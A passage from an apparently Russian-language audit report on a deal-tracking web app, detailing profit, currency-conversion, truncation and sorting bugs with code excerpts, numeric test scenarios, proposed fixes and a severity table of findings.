profit          = revenue − cost                                         // :25-29  ✅
marginPct       = profit / cost × 100                                    // :31-36  ✅
```

Знаки верные, деление на ноль прикрыто (`cost === 0 → null`, :34).

**2. `quantity` учтён везде, включая агрегаты.** Присутствует в обеих базовых формулах. Дашборд **не дублирует логику**, а вызывает те же функции (`dashboard.ts:64-75`) — поэтому расхождение между списком и агрегатами по quantity структурно невозможно. В `withdrawalDiscountPct` quantity сокращается (это доля) — корректно.

**3. `fx_rate` применяется НЕпоследовательно** → см. **E-5**.

**4. Для денег используется `float`, а не `Decimal`** → см. **E-6**.

**5. Агрегаты НЕ сходятся** → см. **E-1**.

**6. `holding` и `withdrawn_via_skin` в торговую прибыль не попадают — корректно.** `src/lib/dashboard.ts:78-89`:

| Метрика | Что включает |
|---|---|
| `netProfit`, `turnover`, `avgMargin`, `closedCount` | **только** `status === "sold"` |
| `withdrawalLoss` | только `withdrawn_via_skin`, как `cost − revenue`, отдельной карточкой |
| `frozenInHolding` | только `holding` |

Разделение сделано правильно. Оговорка — **E-7**.

---

### E-1 · 🔴 Критично · дашборд и список фильтруют по разным датам

**Файлы:** `src/lib/dashboard.ts:78` vs `src/lib/deal-query.ts:39`

```ts
// dashboard.ts:78 — период по дате ПРОДАЖИ
const sold = deals.filter((d) => d.status === "sold" && inRange(d.sellDate, range));

// deal-query.ts:39 — период по дате ПОКУПКИ
if (range) where.buyDate = range;
```

Один и тот же querystring даёт два разных множества сделок. Экспорт CSV (`export/route.ts:15`) наследует логику списка, поэтому выгрузка тоже расходится с дашбордом.

Полный разбор с числами — [Сценарий 2](#сценарий-2--дашборд-и-список-противоречат-друг-другу-e-1).

**Фикс:** выбрать одну семантику периода (для P&L корректна дата **закрытия**) и применять её в обоих путях — либо развести явными подписями «период по дате покупки» / «по дате продажи».

---

### E-2 · 🔴 Критично · `fxFactor` молча возвращает 1 при отсутствии курса

**Файл:** `src/lib/currency.ts:17-23`

```ts
export function fxFactor(from: string, to: string, rates: Rates): number {
  if (from === to) return 1;
  const rf = rates[from];
  const rt = rates[to];
  if (!rf || !rt) return 1;      // ← отсутствие курса неотличимо от «курс 1:1»
  return rt / rf;
}
```

Отдельно опасно, что фолбэк `FALLBACK_RATES` (`currency.ts:7`) здесь **не спасает**: он подставляется только при полном отказе `fetch` (`rates.ts:33`), а не при **частичном** ответе API. `rates.ts:23-25` кладёт в объект только те коды, что реально пришли.

Полный разбор с числами — [Сценарий 1](#сценарий-1--курс-молча-становится-11-e-2).

**Фикс:**
1. `fxFactor` должен бросать исключение (или возвращать `null` с явной пометкой «курс недоступен») вместо `1`
2. `getRates` — валидировать, что пришли **все** коды из `SUPPORTED`, иначе достраивать недостающие из `FALLBACK_RATES`

---

### E-3 · 🔴 Критично · `take: 5000` без `orderBy` — тихое усечение

**Файлы:** `src/app/app/page.tsx:28-31`, `src/lib/deal-query.ts:46-50`

```ts
prisma.deal.findMany({ where: { userId }, include: {...}, take: MAX_ROWS })
//                                                        ↑ без orderBy
```

Полный разбор с числами — [Сценарий 3](#сценарий-3--тихое-усечение-на-5000-сделок-e-3).

**Фикс:**
1. `orderBy: { id: "asc" }` в оба `findMany` → срез становится детерминированным
2. Баннер «показаны первые 5000 из N» вместо молчаливого усечения
3. Агрегаты дашборда считать в SQL (`groupBy` / `aggregate`), а не выборкой всех строк в память

---

### E-4 · 🟠 Высокий · NaN-компараторы и отсутствие tie-breaker

**Файл:** `src/lib/deal-query.ts:91-108`

```ts
const num = (v: number | null, dir: number) => v == null ? dir * -Infinity : v;
...
profit: (a, b) => num(profit(a), -sortDir) - num(profit(b), -sortDir),
```

**Проблема 1 — NaN.** Для двух сделок в холде (обе `profit === null`):
```
(-Infinity) − (-Infinity) = NaN
```
Компаратор возвращает `NaN`, и `Array.prototype.sort` получает несогласованное отношение порядка. Сортировка по «Прибыли» на портфеле с большим количеством холда выдаёт произвольный порядок. Затрагивает компараторы `sellPrice`, `profit`, `margin`.

**Проблема 2 — нет tie-breaker'а.** Ни один компаратор не доопределяет порядок при равных ключах, поэтому итог наследует **неупорядоченный** ответ БД (см. E-3). Между двумя запросами одна и та же сделка может оказаться на странице 1 и на странице 2 — или не показаться нигде.

**Фикс:**
1. Сравнивать null-флаги отдельно, не через `Infinity`-арифметику
2. Финальный tie-breaker `|| a.id.localeCompare(b.id)` во всех компараторах

---

### E-5 · 🟡 Средний · fx-снимки мертвы, история P&L плывёт

**Файлы:** запись `src/lib/deal-data.ts:41,50` · чтение `src/lib/deal-query.ts:65,73`, `src/app/app/page.tsx:48,51`

Курсы **сохраняются**, но **никогда не читаются**. Все пути чтения игнорируют сохранённое значение и пересчитывают по *текущим* курсам:

```ts
// deal-query.ts:65 — вместо d.buyFxRate из БД
buyFxRate: fxFactor(d.buyCurrency, base, rates),
```

**Следствия:**
- Столбцы `buy_fx_rate` / `sell_fx_rate` — мёртвые данные
- Прибыль закрытой в январе сделки меняется каждый раз, когда двигается курс
- `withdrawalDiscountPct` (`deal-data.ts:28`) посчитан по курсу на момент записи и потому **расходится** с тем, что показывает UI (дашборд его не использует, а пересчитывает `cost − revenue`) — тоже мёртвый столбец

Поведение заявлено как «авто-конвертация» (`deal-query.ts:64`), но для учётной системы «прибыль за прошлый год пересчиталась» — обычно не то, чего хотят.

**Решение:** определиться явно — либо читать снимок курса (история фиксируется), либо удалить три столбца, чтобы они не создавали ложного впечатления, что курс зафиксирован.

---

### E-6 · 🟡 Средний · деньги во `float`, а не `Decimal`

**Файлы:** `src/lib/deal-query.ts:62`, `src/app/app/page.tsx:45`

Схема объявляет `Decimal` для всех денежных полей, но на границе всё приводится: `Number(d.buyPrice)`. Вся арифметика — IEEE-754 float.

Классическая ошибка воспроизводится **прямо в формуле** `buyCostBase`:

```
buyPrice = 100, buyFeePct = 5, buyFxRate = 90

1 + 5/100    → 1.05
100 × 1.05   → 105.00000000000001    ← уже не точно
× 90         → 9450.000000000002     вместо 9450
```

Отображение через `Intl.NumberFormat` с `maximumFractionDigits: 2` (`deal-math.ts:57`) это прячет, но точных сверок («сумма по строкам == итог») формула не выдержит.

**Оценка:** для MVP допустимо. Для учёта — либо зафиксировать как принятое ограничение, либо переходить на целые копейки / `Decimal.js`.

---

### E-7 · 🟡 Средний · список считает profit для выводных, дашборд — нет

**Файл:** `src/components/deals-client.tsx:291,353`

В списке сделок дисциплина разделения статусов не соблюдена: `profit()` считается и для `withdrawn_via_skin` (показывается жёлтым), а сортировка по прибыли/марже перемешивает их с проданными. Столбец «Прибыль», сложенный глазами, **не сойдётся** с карточкой «Чистая прибыль» на дашборде.

Дополнительно: `frozenInHolding` игнорирует период вовсе (`dashboard.ts:82` — без `inRange`), хотя рядом стоит переключатель периода. Это задокументировано (`dashboard.ts:3`), но в UI никак не подписано.

**Фикс:** в списке показывать для выводных прочерк вместо profit (как уже сделано для маржи, `:365`), либо визуально отделять; на карточке «Заморожено в холде» подписать «на текущий момент».

---

## Тестовые сценарии с числами

### Сценарий 1 — курс молча становится 1:1 (E-2)

**Дано:** пользователь с базовой валютой RUB покупает предмет за **10 000 CNY**, комиссия 0.

**Ожидание:** при курсах `{USD:1, RUB:90, CNY:7.1}` → `fxFactor(CNY→RUB) = 90 / 7.1 = 12.676` → **126 760 ₽**

**Что происходит:** `open.er-api.com` отвечает `200 OK`, но без ключа `CNY` (частичный ответ). `rates.ts:23-25` кладёт в объект только пришедшие коды:

```ts
const rates: Rates = { USD: 1 };
for (const c of SUPPORTED) {
  if (typeof j.rates[c] === "number") rates[c] = j.rates[c];   // CNY пропущен
}
```

Получается `{USD:1, RUB:90, EUR:0.92}` — **без CNY**. Далее `rates["CNY"] === undefined` → `!rf` → `fxFactor` возвращает **1**.

**Результат:**

| | Ожидалось | Фактически |
|---|---|---|
| Стоимость покупки | 126 760 ₽ | **10 000 ₽** |
| Ошибка | — | занижение в **12.7 раза** |
| Предупреждение в UI | — | **отсутствует** |

Поедут все производные: чистая прибыль, «заморожено в холде», маржа, топ прибыльных/убыточных.

---

### Сценарий 2 — дашборд и список противоречат друг другу (E-1)

**Дано:** одна сделка.

| Поле | Значение |
|---|---|
| `buyDate` | 2026-01-15 |
| `sellDate` | 2026-06-20 |
| `status` | `sold` |
| `buyPrice` | 1000 ₽, комиссия 0 |
| `sellPrice` | 2000 ₽, комиссия 0 |
| **profit** | **+1000 ₽** |

**Запрос — один и тот же querystring на две страницы:**
```
?period=custom&from=2026-06-01&to=2026-06-30
```

| Страница | Код | Что фильтрует | Результат |
|---|---|---|---|
| `/app` | `dashboard.ts:78` `inRange(d.sellDate, range)` | sellDate = 20.06 → **входит** | Чистая прибыль **+1000 ₽**, закрыто сделок **1** |
| `/app/deals` | `deal-query.ts:39` `where.buyDate = range` | buyDate = 15.01 → **не входит** | «Под фильтры ничего не подошло», **0 сделок** |

Дашборд утверждает, что в июне заработана 1000 ₽; список за тот же июнь показывает пустоту. Экспорт CSV наследует логику списка → выгрузка тоже расходится.

---

### Сценарий 3 — тихое усечение на 5000 сделок (E-3)

**Дано:** у пользователя **6000** сделок, каждая с прибылью **+100 ₽**. Настоящая чистая прибыль — **600 000 ₽**.

**Что происходит:**

1. `take: 5000` без `orderBy` → SQLite вернёт первые 5000 в порядке `rowid`, но этот порядок **ничем не гарантирован** (Prisma его не задаёт)
2. Дашборд показывает **500 000 ₽**. Недостача **100 000 ₽**, ни одного предупреждения
3. На `/app/deals` рядом оказываются два несогласованных числа:

| Число | Источник | Значение |
|---|---|---|
| «Всего сделок» | `deal.count({where:{userId}})` — `deals/page.tsx:31` | **6000** |
| `total` в пагинации | `all.length` — `deals/page.tsx:42` | **5000** |

4. `pageCount = ceil(5000 / 50) = 100` страниц вместо 120 → **последние 1000 сделок недостижимы через UI** и не попадают в CSV-экспорт

**Усугубляющий фактор (E-4):** порядок нестабилен. Ни один компаратор не имеет tie-breaker'а, поэтому при равных ключах итог наследует неупорядоченный ответ БД — между двумя запросами одна и та же сделка может оказаться на странице 1 и на странице 2. А для двух сделок в холде компаратор `profit` возвращает `NaN`.

---

## Приложение: полный список находок

| ID | Sev | Название | Файл:строка |
|---|---|---|---|
| A-1 | 🔵 | check-then-act без транзакции | `src/lib/actions/deals.ts:128-132, 178-183` |
| A-2 | ⚪ | `/api/deals/template` без auth | `src/app/api/deals/template/route.ts:4` |
| B-1 | 🔵 | `platform` не валидируется | `src/lib/deal-list.ts:68` |
| B-2 | 🔵 | `q` без ограничения длины | `src/lib/deal-list.ts:69` |
| B-3 | 🔵 | Нет верхних границ у цен и `quantity` | `src/lib/validation.ts:33-55` |
| B-4 | 🟡 | Payload импорта не валидируется схемой | `src/lib/actions/import.ts:207-213` |
| B-5 | 🔵 | `resolvePlatform` без лимита | `src/lib/actions/import.ts:242-250` |
| B-6 | 🔵 | Дата покупки в будущем | `src/lib/validation.ts:63` |
| C-1 | 🔵 | `findUniqueOrThrow` без `select` | `src/app/app/page.tsx:27`, `settings/page.tsx:17` |
| C-2 | 🟠 | CSV formula injection | `src/lib/deal-csv.ts:46-58` |
| C-3 | 🟠 | `/api/skins` — усилитель нагрузки | `src/app/api/skins/route.ts:16-27` |
| D-1 | 🔵 | `secure` cookie не задан явно | `src/auth.ts:35` |
| D-2 | 🟠 | Rate-limiter без вытеснения | `src/lib/rate-limit.ts:6` |
| D-3 | 🟠 | Нет rate-limit на импорт/экспорт/skins | `src/lib/actions/import.ts`, `api/skins`, `api/deals/export` |
| D-4 | 🟡 | `script-src 'unsafe-inline'` | `next.config.ts:10` |
| E-1 | 🔴 | Дашборд по `sellDate`, список по `buyDate` | `dashboard.ts:78` vs `deal-query.ts:39` |
| E-2 | 🔴 | `fxFactor` → 1 при отсутствии курса | `src/lib/currency.ts:20` |
| E-3 | 🔴 | `take: 5000` без `orderBy` | `app/page.tsx:28`, `deal-query.ts:46` |
| E-4 | 🟠 | NaN-компараторы, нет tie-breaker | `src/lib/deal-query.ts:91-108` |
| E-5 | 🟡 | Мёртвые fx-столбцы, история P&L плывёт | `deal-data.ts:41,50` |
| E-6 | 🟡 | Деньги во `float` | `deal-query.ts:62`, `app/page.tsx:45` |
| E-7 | 🟡 | Список считает profit для выводных | `src/components/deals-client.tsx:291` |
| — | 🟡 | `npm audit`: 3 high / 4 moderate | `package.json` |

**Итого:** 3 критичных · 6 высоких · 7 средних · 8 низких/информационных
